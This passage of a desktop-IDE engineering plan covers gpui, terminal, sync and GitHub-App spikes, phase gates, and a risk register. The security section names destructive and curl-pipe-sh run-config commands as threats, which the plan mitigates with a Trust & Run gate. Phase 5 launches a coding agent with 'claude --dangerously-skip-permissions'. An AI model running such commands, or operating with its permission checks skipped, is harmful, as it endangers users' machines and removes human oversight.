Three unknowns can invalidate large chunks of the plan if they turn out wrong. Fable runs each as a throwaway spike **before or at the very start of the phase that depends on it**, times each to a short box, and reports the answer up before pouring in real work. These are not optional — they are the difference between finding a blocker in an afternoon and finding it three phases deep.

**Spike A — drive upstream `alacritty_terminal 0.26` standalone via the parser advance loop (de-risks §06 / Phase 4).** The entire terminal design rests on the assumption that we can own the PTY master, feed bytes through `vte`/alacritty's parser into a `Term<T>` grid, and read the resulting cells out for painting — *without* Zed's GPL integration code. The spike: a ~150-line binary that opens a PTY via `portable-pty`, spawns `bash`, and in a loop reads master bytes and drives them through alacritty's `Processor`/`Term` (upstream 0.26's advance API), then dumps the grid to stdout on each frame. Confirm that (1) upstream 0.26's public API exposes `Term`, `Grid`, the parser, and a `Config` we can construct without the fork's patches, and (2) the byte→grid path works standalone so the read-loop software tee (feed emulator *and* steer publisher from one read) is viable. **If upstream 0.26 has diverged from the fork in a way that blocks standalone driving, that's a Phase-4 architecture decision to surface immediately** — but the tee model itself (we own the master, fan out in software) does not depend on any Zed code, so this should confirm green.

**Result (2026-07-02): GREEN.** The spike ran against the real upstream crates (`alacritty_terminal 0.26.0` / `vte 0.15.0` / `portable-pty 0.9.0`): PTY ownership, byte→grid, the single-reader software tee, resize/SIGWINCH, and the DA/DSR reply path all confirmed end-to-end. The API corrections it surfaced (the vte re-export rationale, the own-`Dimensions` impl, the required `Processor` turbofish, `TextAreaSizeRequest`, `Osc52::Disabled`) are folded into §6.

**Spike B — confirm the exact pinned gpui rev's bootstrap API vs the researched examples (de-risks §03 / Phase 1).** The architecture snippets throughout §03/§04 are written against the gpui API as it appears in the downloaded refs, but gpui-component pins gpui to an exact git rev (`1d217ee39d381ac101b7cf49d3d22451ac1093fe`) and gpui's API surface (the `gpui::Application::new().with_assets(…).run(…)` bootstrap + `on_open_urls`, `cx.open_window`, `Entity`/`cx.new`, the async-closure `cx.spawn`, the `Styled` builder, `gpui_component::init`) has been churning. The spike: pin the workspace to that exact rev, get the *stock* gpui-component example (e.g. the `story`/gallery example under `/Users/niach/.claude/jobs/f54ce572/tmp/gpui-component/examples/`) compiling and opening a window locally, and diff the real bootstrap call sequence against what §03 assumes. Lock `rust-toolchain.toml`'s `channel` to whatever that example builds under (**Open question resolved here:** don't pin the toolchain until this example builds — the pinned gpui rev dictates the MSRV). This spike is the literal first work of Phase 1.

**Result (2026-07-02): GREEN with caveats.** The pinned tree builds and runs (the gallery renders under real GPU; cold build ≈1m43s / 496 crates on the M4 Pro). Corrections folded into §3: the entrypoint is `gpui_platform::application()` (a bare `Application::new()` does not exist at the rev), `on_open_urls` takes `FnMut(Vec<String>)` with no `cx`, gpui-component must be pinned by git rev `a9a7341c35b62f27ff512371c62419342264710c` (0.5.2 is unpublished; registry versions split gpui package ids), windows open inside a foreground `cx.spawn` per the stock examples, and `rust-toolchain.toml` locks `channel = "1.96.0"` (floor 1.95.0 = Zed's own pin).

**Spike C — a real GitHub-App Start-coding end-to-end (de-risks §07 / Phase 5, and closes EXP-4).** The `GITHUB_APP_*` credentials were absent locally, so the launcher (JIT installation-token mint → token-embedded remote → push → MCP `open_pr`) has *never* been run against a real GitHub App — the old native apps stubbed or mocked this path, and EXP-4 reports the desktop falsely said "github not connected." The spike, run at the start of Phase 5: with real `GITHUB_APP_ID`/`GITHUB_APP_SLUG`/`GITHUB_APP_PRIVATE_KEY`/`GITHUB_WEBHOOK_SECRET` configured on a dev web server, manually exercise the server side of the flow (repo resolve via `repositories` tRPC → mint a session-gated installation token → clone with the token remote → push a branch → call the MCP `open_pr` tool) using `curl`/a scratch script *before* wiring the gpui launcher UI. This proves the server contract end-to-end and isolates any GitHub-App misconfiguration from the desktop code. Without this spike, a credential problem would masquerade as a launcher bug for days.

### 11.4 The nine phases with GREEN gates

Each gate below is the acceptance checklist for that phase. Every bullet must be *demonstrated*, not asserted. Where a bullet overlaps another section's territory, the owning section defines the mechanism; the gate here defines the pass/fail.

#### Phase 0 — Repo cut + codegen Rust targets + CI scaffold
**Do:** Delete `apps/linux` entirely (53 tracked Zig+GTK4+libghostty files), the Zig codegen emitter in `packages/domain-contract`, and the dead VM docs (`docs/run-vm.md`, `docs/macos-setup-vm.md`). Add the empty `apps/desktop` Cargo workspace (`Cargo.toml` with `members=["crates/*"]`/`resolver="2"`, committed `Cargo.lock`, `rust-toolchain.toml`, `.cargo/config.toml`, and the nine crate skeletons). Add the `domain-contract` Rust emitter (→ `crates/domain/src/contract.generated.rs`) and the `design-tokens` Rust emitter (→ `crates/theme/src/tokens.generated.rs`), committing their output. Add `.github/workflows/build-desktop.yml` with the generator-drift `git diff` guard. Apply the CLAUDE.md prose deltas. Add the `+dev:desktop`/`build:desktop`/`test:desktop` root `package.json` scripts (the `workspaces` array is unchanged — `apps/desktop` has no `package.json` so the `apps/*` glob skips it, exactly as `apps/linux` was never in `bun.lock`).

**GREEN gate:**
- `bun install` is clean with **zero workspace churn** (no `apps/desktop` in `bun.lock`).
- Both Rust generators re-run with **zero git diff** on the committed `*.generated.rs` files.
- An empty `apps/desktop` `cargo build` is green.
- web + android + iOS still build green (nothing in the trunk touched them).
- `grep -rn` finds **no residual `apps/linux` / Zig / libghostty references** in docs or config.

#### Phase 1 — Desktop skeleton + Exponential Dark theme + app shell
**Do:** Run Spike B first. Bootstrap the gpui-component app: pin gpui/`gpui_platform`/`gpui_macros` to gpui-component's exact rev; the `theme` crate builds the gpui-component `ThemeColor` (Hsla) programmatically from the generated `Srgb8` consts (forced dark, compact density, single source of truth = design-tokens, no hand-authored JSON); `Root` + `Workspace` `DockArea` with a **non-collapsible** `Sidebar` (EXP-1#8), empty center `TabPanel`s, an empty bottom terminal dock, and `DockAreaState` persistence per window; multi-window via a second `cx.open_window`.

**GREEN gate:**
- The window opens at the Exponential Dark theme (matches web tokens by eye).
- Sidebar / center / bottom-dock render at **compact density** (EXP-2f).
- A second window opens **sharing the global `Store`**.
- Rapid resize causes **no zero-size panics** (Taffy layout stays valid at 0×0).

#### Phase 2 — Rust ElectricSQL sync engine (14 shapes + auth + EXP-1#13)
**Do:** Run Spike A alongside if not already done. Implement the `sync` crate (`protocol.rs`/`client.rs`/`store.rs` on rusqlite/WAL/`manager.rs`, all gpui-free) + `collections.rs` gpui glue; implement `api`-crate auth (`login.rs`, the file-based `token_store.rs` (0600), `opener.rs` chain, the tRPC client, the auto-minted `expu_` key). One dedicated `std::thread` per shape (14 per account), each a blocking `ureq` ~90s long-poll over rustls. Bake in every EXP-1#13 gotcha: 401→reauth (never silent anon degrade), 409 must-refetch → atomic refetch from `offset=-1` re-adopting the new shape handle with **no stale body served**, no URL-cache reuse (`cache-control: private, no-store` honored), sorted id lists in the where clause so shape identity is byte-stable.

**GREEN gate:**
- `protocol.rs` passes **ALL** `packages/electric-protocol` fixtures.
- Live sync of the **14 shapes** renders a board.
- Quit + restart resumes from the **persisted cursor** (no full re-fetch).
- A forced 409 does an **atomic refetch with no empty-table flicker**.
- A dead token routes to **login** (not an empty board) — the exact EXP-1#13 regression.
- The long-poll holds ~60s (canary), **not <1s hammering**.

#### Phase 3 — UI parity: screens + markdown editor + autocomplete
**Do:** Build every web screen via gpui-component (sidebar, board/issue-list virtualized, issue detail, create-issue/create-project/create-workspace dialogs, inbox, my-issues, settings/*, account) reading the §2 collections and mutating via tRPC with the `awaitTxId` gate. Port `filters.ts` + `domain.ts` verbatim. Build the from-scratch GFM markdown editor (**own sub-gate**), the caret-anchored @email/#IDENT autocomplete, issue-ref pills, and clipboard image paste (EXP-1#7). Land all EXP-1 chrome fixes (workspace picker as shadcn dropdown #1, sidebar "+" on Projects #2, My Issues/Inbox/Search in sidebar #3, web-styled filter tabs + list bg #4/#12, shadcn dropdowns with icons #5, web-parity create dialog #6, Send Feedback directly in sidebar #10, Settings in the bottom dropdown #11, old Google-Calendar integration removed #9).

**Markdown-editor sub-gate (must pass before the phase can close):** the editor round-trips the GFM byte-parity fixtures (the same contract web/iOS/Android honor).

**GREEN gate:**
- Side-by-side pixel-diff of board / detail / sidebar **and the login/auth screen** vs web at compact density passes; the **login view presents the cloud/sign-in button first** (EXP-5).
- The markdown editor round-trips the GFM byte-parity fixtures (sub-gate above).
- @mention + #ref autocomplete work with **keyboard navigation**.
- Image paste **inserts + uploads**.
- The virtualized list + inline dropdowns mutate via tRPC and reflect the **Electric echo**.
- The EXP-1 chrome punch-list is **visibly satisfied** (walk all 13 sub-points except #13, handled in Phase 2).

#### Phase 4 — Embedded terminal (alacritty_terminal + PTY tee + tabs)
**Do:** Run Spike A first if not already. Reimplement the terminal cleanly over upstream `alacritty_terminal 0.26` + `portable-pty` (we own the master): `pty.rs`, `emulator.rs` (alacritty `Term` + `vte` `Processor`), `read_loop.rs` (**the steer tee** — one read fans out to emulator + publisher), `keys.rs` (reimplemented `to_esc_str`), `mouse.rs`, `element.rs` (gpui grid: `layout_grid` + paint + cursor + selection + resize/SIGWINCH), and `tab.rs` + `manager.rs` (JetBrains multi-tab `TerminalManager` in the bottom dock, EXP-2e). Study Zed's `crates/terminal`/`terminal_view` (GPL) for *approach only* — copy nothing.

**GREEN gate:**
- An interactive shell + `vim` + the `claude` TUI render and resize correctly.
- A CJK/emoji sample **doesn't smear** (wide-char cell handling correct).
- Multi-tab add / close / switch works.
- Child exit **ends the `coding_sessions` row**.
- The read-loop tee simultaneously feeds the emulator **AND** a stub relay consumer (proves §08's tee point before §08 exists).

#### Phase 5 — IDE features (Start-coding launcher + hidden key + run configs + diff + doctor)
**Do:** Run Spike C first. Wire the `coding` crate: the full Start-coding sequence (repo resolve via `repositories` tRPC → JIT GitHub-App installation token → worktree + `exp/<ID>` branch + token-embedded remote **never logged** → `.mcp.json` pointing at web `/api/mcp` + seeded `PROMPT.md` → `codingSessions.start` → spawn `claude --dangerously-skip-permissions` into a Phase-4 tab). The hidden auto-minted `expu_` key in the file-based token store (EXP-2a — never manual). The DB `run_configs` table + `runConfigs` tRPC router (create/list/update/delete/launch) + Trust-and-Run gate + play/stop tabs (EXP-2d/e). The side-by-side syntax-highlighted read-only PR diff (gpui-component `highlighter`). The settings + tooling-doctor onboarding (EXP-2b, EXP-4 — checks the `claude` binary + `git`).

**GREEN gate:**
- A **full Start coding on a REAL repo** where `claude` commits + pushes + opens a PR via the MCP `open_pr` tool.
- The hidden key **auto-mints on first session** + Regenerate works.
- A run-config create/list/launch shows an **exit code** + the **Trust prompt on change**.
- The diff renders **side-by-side highlighted from a real PR**.
- The doctor **blocks Start coding when `claude` is missing** (EXP-4: no false "not connected"); and **with `git` absent, the doctor also blocks Start coding with an actionable error** (EXP-2b requires verifying both tools — §7.7).
- **Two concurrent sessions run in two windows.**

#### Phase 6 — Steer publisher (control channel + session publisher)
**Do:** Implement the `steer` crate as the relay **publisher** over the frozen wire protocol (`tokio-tungstenite` + rustls, both `ws` and `wss`): `control_channel.rs` (per-app device presence + inbound `start_session` → the Phase-5 launcher) and `publisher.rs` (per-session tee of `0x01` output frames + inject remote input + resize + claim/kill + ring-buffer replay + auto-reconnect), plus the own-row Electric kill-switch. The desktop consumes server-minted steer tickets — it never signs.

**GREEN gate:**
- The desktop publishes a live session; a web viewer **watches AND steers** (types into `claude`).
- **Take over** does release-then-claim.
- A **kill from web ends the session**.
- **wss** (TLS relay) and **ws** (LAN relay) both connect.
- The publisher **reconnects after a socket drop**, resuming the room from the ring buffer.
- An **own-row Electric kill aborts** the session.

#### Phase 7 — iOS self-containment + clean-code + sync carry-in (PARALLEL)
**Do:** Delete the `ExponentialMac` target + ghostty vendoring; rewrite `apps/ios/Project.swift` to 7 iOS targets / 4 schemes; keep `ExpCore`/`ExpUI` as iOS-only frameworks; strip the `#if os(macOS)` shim branches + collapse `KeychainStore` (preserve the shared access group so Share-to-Exponential keeps reading the token); carry the EXP-1#13 hardening into the iOS `ShapeClient`/`SyncManager` via an **additive** GRDB migration.

**GREEN gate:**
- The `Exponential` scheme builds **iOS-only** (no mac target in the generated project).
- `ExpCoreTests` green (AnnotationGeometry parity + VTScreen).
- Share-to-Exponential still reads the token (shared access group intact).
- The 14 shapes sync and a **forced 409 does an atomic refetch on iOS**.

#### Phase 8 — Green + release
**Do:** Update `vision.md` (platform-roles table + platform lists), CLAUDE.md, and the masterplan docs to the **four-surface reality**. Produce packaged builds as **release-time manual steps** (macOS `.app` codesign + `notarytool`; Linux AppImage/`.deb`). Confirm the full killer flow end-to-end (issue → Start coding → steer from phone → PR) on real hardware.

**GREEN gate:**
- The killer flow works end-to-end on **macOS + a real-GPU Linux box**.
- **On a fresh Ubuntu box with no / broken default-browser association, "Sign in with Google" reaches a real browser via the opener chain (never a text editor) and the OAuth callback returns to the app** (EXP-5 — the fresh-Ubuntu blocker; validated on real Linux hardware, not a VM).
- **Unsigned** desktop artifacts build in CI on a `desktop-v*` tag.
- All **four surfaces** (web, iOS, Android, desktop) sync the 14 shapes in lockstep.
- Docs contain **no lingering five-client / native-mac / Zig framing**.

### 11.5 Definition of Done (v1)

The pivot is v1-done when **all** of the following hold simultaneously:

1. **Desktop is a 1:1 copy of web at compact density.** Every web screen has its gpui-component mirror; the board/detail/sidebar pass side-by-side pixel-diff; the markdown editor is GFM byte-parity; the EXP-1 chrome punch-list is fully satisfied.
2. **Desktop runs coding sessions.** A real Start-coding on a real repo drives `claude` to commit, push, and open a PR via MCP; run configs launch from the DB; the diff renders; the doctor gates on missing tooling.
3. **Desktop publishes to the steer relay.** A phone watches and steers a live desktop session over the frozen wire protocol; kill/claim/reconnect all work; ws and wss both connect.
4. **iOS builds iOS-only with the sync hardening.** No mac target, `ExpCore`/`ExpUI` iOS-only, EXP-1#13 carried in, tests green.
5. **web / android untouched and green.** The trunk changed nothing in those surfaces; they still build and sync.
6. **Docs updated.** `vision.md`, CLAUDE.md, and the masterplan docs describe four surfaces with zero five-client/native-mac/Zig residue.
7. **Unsigned desktop artifacts build in CI on `desktop-v*`.** Signing, notarization, and AppImage/.deb packaging are acknowledged **release-time manual TODOs**, explicitly out of the v1-done bar.

When those seven hold, the repo is the four-surface end state — web/server+relays, Android, cleaned iOS, and the new gpui desktop IDE — and the killer flow (issue → Start coding → steer from phone → PR) runs on real macOS and Linux hardware. That is v1.


---

## 12. Risks & open questions

This section is the honest ledger for the v3 desktop cut. It names where Fable is most likely to lose weeks, where a wrong early decision is expensive to unwind, where the licensing and security boundaries are absolute, and the genuinely-open questions that must be answered (some before Phase 1, some by Phase 8). Each risk carries a concrete mitigation and, where relevant, the phase gate that proves the risk is retired. Read this alongside [11-execution-plan] — the phases below are named there — and treat the "must decide before" callouts as blocking.

The through-line: the desktop app is the highest-variance thing in the whole repo. The server, relays, Android, and (post-cleanup) iOS are known quantities. `apps/desktop` is a new Rust GPU app on two pre-1.0 dependencies, a hand-rolled terminal grid, and a from-scratch sync engine whose correctness is unforgiving. Estimate generously and hold the non-goal line hard.

### 12.1 Dependency maturity: gpui + gpui-component are pre-1.0 and move fast

**Risk.** Neither `gpui` (Zed's UI framework, Apache-2.0) nor `gpui-component` (longbridge, Apache-2.0) is API-stable. gpui has no crates.io release cadence we can rely on — Zed develops it in-tree and cuts occasional `0.2.x` publishes that lag the git tree by weeks. gpui-component (`0.5.2`) pins gpui to an **exact git rev** (`1d217ee39d381ac101b7cf49d3d22451ac1093fe`) in its own `Cargo.toml`. This is load-bearing (see [03-desktop-architecture], LD-7): **you cannot mix a crates.io `gpui = "0.2.2"` with the git-pinned component** — they are different `gpui` crates to Cargo, the trait impls won't unify, and `Entity<T>`/`Render`/`Window`/`App` types from the two copies are incompatible. The compile error is a wall of "expected `gpui::Entity`, found `gpui::Entity`" mismatches that reads like a compiler bug and isn't.

**Mitigation (decided).** The entire `apps/desktop` workspace inherits gpui-component's exact rev. Pin it once, in the workspace root `Cargo.toml`, via `[patch]`/direct git deps, and let every crate depend on `gpui` through the workspace, never independently:

```toml
# apps/desktop/Cargo.toml  (workspace root)
[workspace.dependencies]
gpui = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe" }
gpui_platform = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe" }
gpui_macros = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe" }
gpui-component = { git = "https://github.com/longbridge/gpui-component", rev = "a9a7341c35b62f27ff512371c62419342264710c" }
```

`Cargo.lock` is **committed** (this is an app, not a lib) so the rev is frozen in CI and on every dev machine. Bumping gpui-component is therefore a **coordinated three-line change** (component rev + the three gpui revs it now pins) plus a fixup pass — never a casual `cargo update`. Budget this as recurring maintenance: expect to eat one API-churn migration every time you bump, most painfully on the **dock**, **highlighter**, and **input** surfaces (the three widgets whose APIs have moved most between `0.4.x`→`0.5.x`). These are also our three most load-bearing widgets: `dock` is the whole shell ([03], [04]), `input` is the markdown editor's substrate ([04]), `highlighter` is the diff/code renderer ([07]).

**Open question — pin selection.** The **exact** gpui-component release tag, its matching gpui rev, and the `rust-toolchain.toml` channel are not yet chosen. Decide in **Phase 0/1** by taking the newest gpui-component tag whose `examples/` build clean against a stable toolchain, then locking all three together. Do **not** track `main` on either repo. Once EXP ships, bumps are opt-in and gated behind a green Phase-2..6 regression pass. Record the chosen triple in `docs/masterplan-v3.md` and `apps/desktop/rust-toolchain.toml`.

**Learning-curve reality.** The steepest part of the curve is not gpui's reactivity model (observe/notify is straightforward) — it's gpui-component's `dock` (Panel trait, `DockArea`, `DockAreaState` serde persistence) and the `Input`/`InputState` state machine we bend into a rich editor. Front-load reading `/Users/niach/.claude/jobs/f54ce572/tmp/gpui-component/examples/` (especially the dock and input examples) and `crates/ui/src/dock/` before writing Phase 1.

### 12.2 Platform coverage: Linux is the least-mature target, and that's exactly where EXP-5 lives

**Risk.** gpui's Linux backend is the youngest of the three. The **Feb-2026 Blade→wgpu switch** removed the Blade renderer and routed Linux (and Windows) through `wgpu`/Vulkan; it fixed the worst class of compositor freezes but is **recent** and under-soaked. EXP-5 ("linux app issues") already burned us here on the *old* native stack: a broken `xdg-open` opened a text editor instead of a browser during Google OAuth, hard-blocking login on fresh Ubuntu. The new app inherits the whole surface of "Linux desktop is a matrix, not a platform."

**Concrete hazards to validate on REAL hardware (not the VM):**
- **GNOME vs KDE**, **Wayland vs X11** — four combinations. gpui behaves differently on Wayland (client-side decorations, fractional scaling, no global cursor warp) vs X11 (server-side decorations). Window controls, DPI, and the title bar (`gpui-component`'s `title_bar` / `window_border`) must be checked on all four.
- **Real GPUs** — Vulkan driver quality varies wildly (Mesa/RADV, Mesa/ANV, NVIDIA proprietary). Validate on at least one AMD, one Intel, and one NVIDIA box.
- **The `llvmpipe` UTM VM is NOT representative.** It is a software rasterizer; it will *run* but its performance (and some blending/scissor behavior) will **mislead** — a smooth VM proves nothing about a real compositor, and a slow VM is not necessarily a real regression. Do perf and freeze validation on metal, not in QEMU/UTM. The old `docs/run-vm.md` VM workflow is being **deleted** in Phase 0 precisely because it gave false confidence.
- **`xdg-open` robustness (EXP-5, direct carry-in).** The OAuth browser-open in `crates/app` must not assume a sane default handler. Use a hardened opener chain (see [03], `api/opener`): try `xdg-open`, then `gio open`, then `$BROWSER`, then well-known browser binaries by name; on total failure, **surface the URL in a copyable dialog** rather than silently launching a text editor or hanging. Never block login on the launcher succeeding.

**Windows.** gpui compiles for Windows and gpui-component supports it, but Windows is **not a gated target** in v3 CI and is out of scope for the killer-flow sign-off. Keep the door open (don't write `#[cfg(unix)]`-only code where a portable API exists; keep `portable-pty`'s Windows path intact) but make no Windows correctness promises. **Open question:** whether Windows becomes a gated target post-v3 — deferred.

**Gate mapping.** Phase 1's gate ("window opens at Exponential Dark, rapid resize causes no zero-size panics") and Phase 8's gate ("killer flow works on macOS + a **real-GPU** Linux box") are the two places Linux maturity is proven. Do not sign off Phase 8 on a VM.

### 12.3 gpui correctness traps: zero-size surfaces panic, duplicate element IDs drop nodes

Two gpui-specific footguns are real correctness traps, not style nits, and both bite hardest in exactly the dynamic surfaces we build the most of (virtualized issue lists, docked/resizable panels, multi-tab terminal):

- **Zero-size render surfaces panic on wgpu/Metal.** If a window, layer, or GPU-backed element is laid out to `0×0` (mid-resize, a collapsed dock, a not-yet-measured panel, a `uniform_list` before first layout), the backend can panic on texture/surface creation. This is why Phase 1's gate explicitly stress-tests **rapid resize** and why the terminal grid ([06]) must clamp its computed rows/cols to `>= 1` before allocating. **Mitigation:** every custom `Element` (`terminal/element.rs`, the diff gutter, any measured canvas) must guard against zero/negative computed dimensions and early-return an empty layout, never a zero-size GPU surface. The non-collapsible sidebar (EXP-1#8, a *feature*) helpfully removes one whole class of collapse-to-zero.

- **Duplicate per-frame element IDs silently drop nodes in release.** gpui identifies retained/stateful elements by `ElementId` within a frame; **two elements with the same id in one frame → the second is silently dropped** (in debug you may get an assert; in release it just vanishes). This is the classic "every issue row after the first with the same key disappears" bug. **Mitigation:** every element in a dynamic list must derive its id from a **stable unique key** — the row's UUID (`issue.id`), the tab's session id, the terminal's pane id — never a loop index (indices collide across re-orders) and never a constant. This is a code-review checklist item for every `for`/`.map` that yields `.id(...)` elements in `crates/ui`. Encode the convention: `div().id(SharedString::from(issue.id.to_string()))`.

Both traps are cheap to prevent and expensive to diagnose after the fact (a release-only vanished row looks like a sync bug — see 12.5). Bake them into the Phase-1/Phase-3 review discipline.

### 12.4 Packaging & distribution: no turnkey bundler in gpui, all hand-rolled

**Risk.** gpui provides **no** app bundler, **no** system tray, and **no** auto-update. Zed ships all of that in its own (GPL, unusable-to-us) outer crates. We hand-roll everything, and it's easy to under-scope in the estimate.

**What must be hand-built:**
- **macOS `.app`** — assemble the bundle (Info.plist from `assets/`, icon set, embedded Inter + Lucide fonts via `AssetSource` so there are **no runtime asset path lookups**), then `codesign` with a Developer ID cert and `xcrun notarytool submit` + staple. In v3 CI these are **unsigned artifacts** (Phase 8 gate: "unsigned desktop artifacts build in CI on a `desktop-v*` tag"); real codesign/notarization is a **release-time manual step** in the checklist, mirroring the existing macOS-notarization note in `CLAUDE.md`.
- **Linux AppImage and/or `.deb`** — this is the fiddly one. The bundle must carry or correctly depend on the **runtime deps**: Vulkan loader + Mesa ICDs, `fontconfig`, `freetype`, and our **embedded fonts** (never rely on the host having Inter). An AppImage that assumes host Vulkan/fontconfig will fail on a minimal distro; a `.deb` must declare the deps. This is where "compiles fine on my machine" and "runs on a fresh Ubuntu" diverge — the same class of gap that produced EXP-5.
- **No tray, no auto-update in v1.** Neither is provided and both are non-trivial. **Open question — deferred to a decision, defaulting to NO for v1:** ship without a system tray and without in-app auto-update (users re-download from releases). Revisit post-v3.

**Supply-chain pin to watch.** gpui pulls **`font-kit` from a Zed git fork** transitively (not the crates.io release). It lands in `Cargo.lock` via the gpui rev; audit it there and re-audit on every gpui bump. It's Apache/MIT-compatible (fine on licensing) but it's a git dependency outside our control — note it in the provenance log next to the terminal-reimpl note (12.7).

**Open question — Linux distribution format.** AppImage vs `.deb` vs plain tarball is not decided. Default: **AppImage** as the primary (single-file, distro-agnostic, matches the "download and run" story) with a **tarball** fallback; `.deb` only if a clean dependency declaration proves easy. Decide by Phase 8.

### 12.5 Effort concentration: three multi-week items, and one is make-or-break

The estimate is not evenly spread. Three items dominate the risk-adjusted schedule; under-budgeting any of them sinks the timeline.

1. **The GFM markdown editor — the make-or-break item (Phase 3 sub-gate).** There is **no rich-text framework in gpui** to lean on — no TipTap, no equivalent of iOS's block model. We build a GFM byte-parity editor on top of gpui-component's `Input`/`InputState` (a plain text substrate) from scratch: **byte-parity round-trip** against `packages/electric-protocol`/the shared GFM fixtures (the same contract web's TipTap+tiptap-markdown and iOS's cmark-gfm honor), **decoration pills** for `@email` mentions and `#IDENT` issue-refs (caret-anchored autocomplete + rendered pill overlays), **clipboard image paste** (EXP-1#7 — decode clipboard image → upload via the attachments path → insert the canonical `![alt](/api/attachments/{id})` relative form), and a working **undo/redo** stack that survives all of the above. This is multiple weeks on its own and it is the single feature most likely to slip. It owns its own sub-gate inside Phase 3 for exactly this reason. See [04-ui-parity-theming] for the editor design; this section only flags it as the schedule's tent-pole.

2. **The terminal grid ([06]).** Reimplementing the paint path over upstream `alacritty_terminal` is **~1.2–1.5k LOC of pixel-accurate `Element`** (cell layout, cursor, selection, damage, resize/SIGWINCH) plus a **~420-line key-encoding table** (`keys.rs`, a clean reimplementation of terminal key→escape-sequence mapping). Neither is conceptually hard; both are *voluminous and detail-exact* — an off-by-one in cell metrics smears CJK/emoji, a wrong key mapping breaks vim. Budget it as a full phase (Phase 4) and lean on the fixtures/behaviors, not on Zed's GPL code (12.7).

3. **The sync engine ([05]).** It's a **faithful port** of a proven design (the Swift `ExpCore/Sources/Electric/` and Zig `apps/linux/src/core/` engines already work), so the *shape* is de-risked — but **EXP-1#13 correctness is unforgiving**. The 409/must-refetch → atomic re-fetch-from-offset-`-1` → re-adopt-new-handle path, the no-URL-cache rule, the 401→re-auth (never silent anonymous degrade), and the **sorted `where`-clause id lists** (order flips rotate shape handles into 409 loops) must all be right on day one, because getting them wrong reproduces the exact "all issues vanished, projects empty" bug that EXP-1#13 was — and, per 12.3, a gpui element-id bug *looks identical to* a sync bug, so a correct sync engine is also what lets you trust your eyes when debugging the UI. Phase 2's gate ("a forced 409 does an atomic refetch with no empty-table flicker; a dead token routes to login, not an empty board") is the proof.

**The overrun lever: the non-goal line.** The parity surface is **~15 screens** (sidebar, board/list, detail, create-issue/project/workspace dialogs, inbox, my-issues, settings/*, account, diff, run-bar). It stays ~15 screens **only if** we hold the non-goals hard: **no billing UI, no admin console, no widget-settings UI, no mobile-only surfaces** on desktop (billing/admin are web-only by product decision per `CLAUDE.md`; widget management stays web). Every "while we're here, let's also add…" is a week. The traceability matrix in [10-unchanged-and-exp-traceability] is the contract for what's *in*; anything not on it is out for v1.

### 12.6 Licensing: the GPL boundary around Zed's terminal is absolute

**Risk.** Zed's `crates/terminal` and `crates/terminal_view` (in the local reference tree at `/Users/niach/.claude/jobs/f54ce572/tmp/zed/crates/terminal*`) are **GPL-3.0-or-later**. Our desktop app is **not** GPL and must stay Apache/MIT-clean (every dependency we pull is Apache/MIT — see [03]). We may **study** those crates to learn the `alacritty_terminal` integration; we may **not** copy their code — not verbatim, not lightly-edited, not "translated." Copying GPL code into a non-GPL app is a license violation, full stop.

**The highest copy-temptation spots** — because they're the exact places where "just do what Zed does" is most tempting — and our clean-reimpl obligation:
- **`mappings/keys.rs`** (Zed's terminal key→escape mapping) — reimplement `keys.rs` from the **terminal spec / xterm behavior and vte semantics**, not from Zed's table. This is our ~420-line table; write it against documented CSI/SS3 sequences and validate against a real `vim`/`claude` TUI, not against Zed's source.
- **`layout_grid`** (Zed's terminal_view cell-layout paint) — our `terminal/element.rs` `layout_grid`/paint is written against `alacritty_terminal`'s `Term`/`Grid`/`RenderableContent` public API and gpui's `Element` trait directly. Same problem, independent solution.
- **`convert_color`** (Zed's ANSI color → renderer color) — reimplement the ANSI/indexed/RGB → `gpui::Hsla` mapping from the color model, sourcing palette values from our own `theme` crate, not Zed's.

**Mitigation (decided).** Keep a short **provenance note** — a `PROVENANCE.md` or a header block in `crates/terminal/` — stating plainly: "`alacritty_terminal` (upstream, Apache-2.0) provides the parser/grid; the gpui paint path, key table, and color mapping are a clean-room reimplementation informed by the terminal spec and alacritty's public API. Zed's GPL `terminal`/`terminal_view` were read for understanding only; no code was copied." This is cheap insurance and the right thing. Note also the `font-kit` fork pin from 12.4 in the same log. The boundary is not a gray area — treat "did I look at Zed's file while writing this function?" as the tell, and if the answer is yes, write the function from the spec instead.

### 12.7 Security: DB-stored run-config argv reverses "never execute synced values"

**Risk.** EXP-2d moves run configs **out of the repo and into the database** (`run_configs` table, server-only, tRPC — the one schema addition in v3, see [07]). A run config *is* a terminal command (argv + cwd + env) that the desktop **executes locally**. This directly **reverses** the sync engine's cardinal rule ("never execute synced values") — we are now, deliberately, executing values that came over the wire from a shared, multi-user workspace. A malicious or compromised workspace member could author a run config whose command is `rm -rf` or a curl-pipe-sh, and any teammate who hits "play" runs it on their machine.

**Mitigation (decided) — the per-device Trust & Run gate is the only real boundary.** Run configs are **never auto-executed**. The first time a device sees a given run config *and every time its command/args/env/cwd changes*, launching it requires an explicit **Trust & Run** confirmation showing the exact resolved argv the user is about to execute. Trust is **per-device** (stored locally, e.g. keyed by run-config id + a hash of its command payload), never synced — trusting on your laptop does not trust on your teammate's. This is stated in [07]'s design and gated by Phase 5 ("a run-config create/list/launch shows an exit code + **the Trust prompt on change**"). The gate is deliberately annoying on change; that friction is the feature.

**Steer remote-input injection.** The steer publisher ([08]) lets a phone **inject keystrokes into the local terminal** (into `claude`, into a shell). That is remote code execution by design and must stay gated by the **ticket perm**: an incoming steer frame may inject input **only** if the session's server-minted `steer-ticket` carries the write/steer permission (the relay verifies HS256; the desktop re-checks the claim). A view-only ticket must be able to *watch* the tee but **never** write to the PTY master. The wire protocol and ticket format are **frozen** (owned by `packages/steer-ticket` + `apps/steer-relay`); the desktop is a consumer of server-minted tickets and does **no** client-side signing. Phase 6's gate ("a web viewer watches AND steers … view-only cannot") is where this is proven.

Both of these are cases where the desktop's IDE power (execute commands, accept remote input) is intentionally sharp; the mitigations are the *only* thing standing between "powerful IDE" and "remote-exploitable." They are not optional polish.

### 12.8 Open questions (consolidated)

These are the genuinely-undecided choices. Each says **when** it must be resolved and gives a default/leaning where one exists so Fable is never blocked waiting on a committee. These are the same items surfaced in the doc's `openQuestions` register.

